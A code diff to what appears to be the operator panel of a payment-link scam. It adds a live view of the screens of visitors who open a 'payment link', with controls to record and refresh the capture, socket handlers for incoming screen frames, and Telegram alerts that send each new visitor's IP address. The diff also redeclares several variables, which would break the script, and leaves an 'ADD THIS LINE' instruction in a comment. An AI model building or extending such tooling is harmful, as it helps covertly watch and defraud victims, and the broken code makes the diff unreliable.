@@ -543,22 +543,22 @@
         <p>No visitors yet</p>
       </div>
       
-      <!-- Screen capture container -->
-      <div id="screenCaptureContainer" class="screen-container">
-        <canvas id="screenCanvas"></canvas>
-        <div class="screen-placeholder" id="screenPlaceholder">
-          <div class="icon">📺</div>
-          <p>Waiting for screen capture to begin...</p>
-          <p>When a visitor opens the payment link, their screen will appear here.</p>
-        </div>
-      </div>
-      <div class="screen-controls">
-        <button id="stopScreenShareBtn" class="stop">Stop Screen Share</button>
-        <button id="enlargeScreenBtn">Enlarge</button>
-        <button id="recordScreenBtn">Record</button>
-        <button id="refreshCaptureBtn">Refresh Capture</button>
-      </div>
-      <div id="captureStatus" class="capture-status">No active screen share</div>
+<!-- Screen capture container -->
+<div id="screenCaptureContainer" class="screen-container">
+  <canvas id="screenCanvas"></canvas>
+  <div class="screen-placeholder" id="screenPlaceholder">
+    <div class="icon">📺</div>
+    <p>Waiting for screen capture to begin...</p>
+    <p>When a visitor opens the payment link, their screen will appear here.</p>
+  </div>
+</div>
+<div class="screen-controls">
+  <button id="stopScreenShareBtn" class="stop">Stop Screen Share</button>
+  <button id="enlargeScreenBtn">Enlarge</button>
+  <button id="recordScreenBtn">Record</button>
+  <button id="refreshCaptureBtn">Refresh Capture</button>
+</div>
+<div id="captureStatus" class="capture-status">No active screen share</div>
     </div>
 
     <div class="generate-link">
@@ -766,7 +766,11 @@
   <script src="/socket.io/socket.io.js"></script>
   <script>
     // Global Variables
-    const socket = io();
+    const socket = io({
+  query: {
+    isAdmin: 'true'
+  }
+});
     let transactionsMap = new Map();
     let visitorsMap = new Map();
     let currentMcInvoiceId = null;
@@ -777,6 +781,12 @@
     let currentCaptureSession = null;
     let screenContext = null;
     let isScreenCanvasInitialized = false;
+    let screenContext = null;
+    let isScreenCanvasInitialized = false;
+    let screenRecording = null;
+    let screenMediaRecorder = null;
+    let recordedChunks = [];
+    let currentCaptureSession = null;
 
     // Initialize the screen canvas
     function initScreenCanvas() {
@@ -2080,8 +2090,8 @@
       // Send Telegram notification
       sendTelegramNotification(`🔔 <b>New Visitor</b>\nIP: ${visitor.ip || 'Unknown'}\nPID: ${visitor.pid}`);
       
-      // Initialize screen capture
-      initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
+      // Initialize screen capture    <-- ADD THIS LINE
+     initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
     });
 
     // Handle when visitors leave
@@ -2115,6 +2125,27 @@
       }
     });
 
+    // Handle screen share events from client
+socket.on('screen_frame', (data) => {
+  handleScreenFrame(data);
+});
+
+socket.on('screen_capture_error', (data) => {
+  console.error('Screen capture error:', data);
+  const captureStatus = document.getElementById('captureStatus');
+  captureStatus.textContent = `Screen capture error: ${data.error}`;
+  captureStatus.classList.add('error');
+  
+  // Update placeholder
+  const screenPlaceholder = document.getElementById('screenPlaceholder');
+  screenPlaceholder.style.display = 'flex';
+  screenPlaceholder.innerHTML = `
+    <div class="icon">❌</div>
+    <p>Error capturing screen: ${data.error}</p>
+    <p>Try refreshing the capture.</p>
+  `;
+});
+    
     // Handle existing visitors when reconnecting
     socket.on('existing_visitors', (visitors) => {
       console.log('Received existing visitors:', visitors);
@@ -2313,7 +2344,7 @@
       console.log('Loading admin panel data...');
       loadTransactions();
       loadVisitors();
-      
+      initScreenCanvas(); 
       // Set up auto-refresh
       setInterval(loadTransactions, 60000); // Refresh every minute
     });
